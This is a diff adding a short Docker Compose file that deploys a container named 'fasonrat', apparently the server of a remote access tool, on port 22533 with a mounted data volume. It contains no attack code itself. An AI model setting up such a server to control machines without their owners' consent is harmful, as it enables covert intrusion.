@@ -1,0 +1,14 @@
+services:
+  fasonrat:
+    image: fahimahamed/fasonrat:latest
+    container_name: fasonrat
+    restart: unless-stopped
+    ports:
+      - "22533:22533"
+    volumes:
+      - ./data:/app/server/data
+    deploy:
+      resources:
+        limits:
+          memory: 2G
+
